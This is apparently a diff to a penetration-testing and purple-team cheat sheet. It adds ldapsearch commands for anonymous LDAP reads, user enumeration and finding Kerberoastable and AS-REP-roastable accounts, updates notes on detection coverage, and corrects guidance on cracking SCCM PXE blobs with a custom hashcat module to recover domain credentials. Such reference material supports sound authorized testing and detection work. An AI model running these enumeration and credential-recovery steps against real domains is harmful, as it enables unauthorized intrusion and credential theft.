@@ -57,21 +57,23 @@ blue in PURPLE-TEAM.md). That's deliberate, for three reasons, plus one honest g
      Linux material is organized around getting a shell and stabilizing it, not
      around post-exploitation on a Linux host, so those live in the corpus as well.
 
-  ⚠ That leaves ONE unaccounted: ldap-recon (`section: Active Directory — discovery`,
-     `platform: [windows, network]`). It is squarely inside reason 1's subject area, is
-     not in its list, and is projected nowhere — a real gap, not a category. What is
-     missing is the TOOL, not merely the projection: `ldapsearch` appears nowhere in
-     this file, though install/offensive-packages.txt ships ldap-utils EXPLICITLY for
-     this entry, and the native `Get-ADUser -Filter` arm is absent too. The one line
-     that looks like coverage — `nxc ldap ... --trusted-for-delegation` in the AD block
-     — is generated for unconstrained-deleg-tgt, under a different heading and for the
-     attack rather than the recon, so it does not close this.
-     The blue side is worse and is NOT a mirror of this one. BOTH pairs are gaps there
-     (bloodhound-collect-4662 and ldap-recon-4662): each keys off 4662, which is
-     PURPLE-TEAM.md's own criterion for projecting, and neither projects — that file's
-     only 4662 material is DCSync's replication mask, the opposite shape from a
-     collection fan-out, and 1644 is absent from it entirely. Read all three with
-     `htpx` until that is fixed.
+  ✓ ldap-recon (`section: Active Directory — discovery`, `platform: [windows, network]`)
+     WAS the one entry this accounting could not place — projected nowhere and, worse, its
+     TOOL absent: `ldapsearch` appeared in no fold, though install/offensive-packages.txt
+     ships ldap-utils EXPLICITLY for it, and the native `Get-ADUser -Filter` arm was gone
+     too. CLOSED (#341): the `LDAP — TCP 389/636` fold below now carries the anonymous-bind
+     RootDSE read, the authenticated user / Kerberoastable / AS-REP-roastable queries, and
+     the `Get-ADUser -Filter` arm. Like reason 1 this is hand-authored coverage, not a
+     generated projection, so the 19/106 marker counts above are unchanged. The one line
+     that once looked like coverage — `nxc ldap ... --trusted-for-delegation` — is still a
+     different thing: generated for unconstrained-deleg-tgt, an attack under a different
+     heading, not this recon.
+     The blue side is now HALF-closed and was never a mirror of this one. Of its two 4662
+     gaps, ldap-recon-4662 is closed too — PURPLE-TEAM.md's hand-authored `LDAP recon`
+     detection keys off 1644 (the query-text event, formerly absent there) and 4662.
+     bloodhound-collect-4662 remains the one whole detection still missing on that side,
+     whose only 4662 material is DCSync's replication mask — the opposite shape from a
+     collection fan-out. Read all three with `htpx`.
 
 So an unprojected red entry is richer prose here (1), corpus-only tradecraft this file
 doesn't cover (2, 3) — or the one known gap above.
@@ -428,6 +430,25 @@ xfreerdp /v:<ip_address> /u:<user> /p:<password> /cert:ignore /dynamic-resolutio
 ////////////////////////////////////////
 
 
+LDAP — TCP 389/636 (directory discovery)
+++++++++++++++++++++++++++++++++++++++++
+# RootDSE over an anonymous bind — naming contexts + DC info, no creds:
+ldapsearch -x -H ldap://<ip_address> -s base namingContexts defaultNamingContext dnsHostName
+# Anonymous whole-tree read where the DC still permits it (older / mis-set domains):
+ldapsearch -x -H ldap://<ip_address> -b 'DC=<dc>,DC=<dc>' '(objectClass=*)'
+
+# Authenticated user enum:
+ldapsearch -x -H ldap://<ip_address> -D '<user>@<domain>' -w '<password>' -b 'DC=<dc>,DC=<dc>' '(objectClass=user)' sAMAccountName description
+# Kerberoastable — accounts carrying an SPN:
+ldapsearch -x -H ldap://<ip_address> -D '<user>@<domain>' -w '<password>' -b 'DC=<dc>,DC=<dc>' '(&(objectClass=user)(servicePrincipalName=*))' sAMAccountName servicePrincipalName
+# AS-REP roastable — DONT_REQ_PREAUTH; 1.2.840.113556.1.4.803 is the bitwise-AND rule, 4194304 the UAC bit:
+ldapsearch -x -H ldap://<ip_address> -D '<user>@<domain>' -w '<password>' -b 'DC=<dc>,DC=<dc>' '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' sAMAccountName
+# Native arm from a domain-joined Windows box (RSAT, no external tool):
+#   Get-ADUser -Filter * -Properties servicePrincipalName,userAccountControl
+# ldapsearch ships in ldap-utils (apt); this is the corpus' ldap-recon entry.
+////////////////////////////////////////
+
+
 Active Directory — attack paths
 ++++++++++++++++++++++++++++++++++++++++
 # Map the domain (`bhce` wraps the CE-ready collection):
@@ -577,8 +598,11 @@ python3 sccmhunter.py mssql -u <user> -p <password> -d <domain> -dc-ip <ip_addre
 # variables file over TFTP. pxethiefy (csandker) pulls it from the attacker box (-i is the
 # INTERFACE to discover on, -a targets a known DP's IP; needs CAP_NET_RAW — hence sudo):
 sudo python3 pxethiefy.py explore -a <dp-ip>         # or: -i <iface> to discover DPs on the segment
-# The auto-derived blank-password blob cracks with hashcat -m 19850 (SCCM PXE) against rockyou;
-# feed the cracked password back to decrypt the task-sequence variables (domain-join / NAA creds):
+# The auto-derived blank-password blob cracks with hashcat -m 19850 (SCCM PXE) against rockyou.
+# ⚠ 19850 is MWR-CyberSec's CUSTOM ConfigMgr module (configmgr-cryptderivekey-hashcat-module), NOT
+# in stock/Kali hashcat — bare `hashcat -m 19850` errors "hash mode does not exist"; build hashcat
+# with that module first. Then feed the cracked password back to decrypt the task-sequence
+# variables (domain-join / NAA creds):
 python3 pxethiefy.py decrypt -p "<cracked-pw>" -f <downloaded>.boot.var
 ////////////////////////////////////////
 
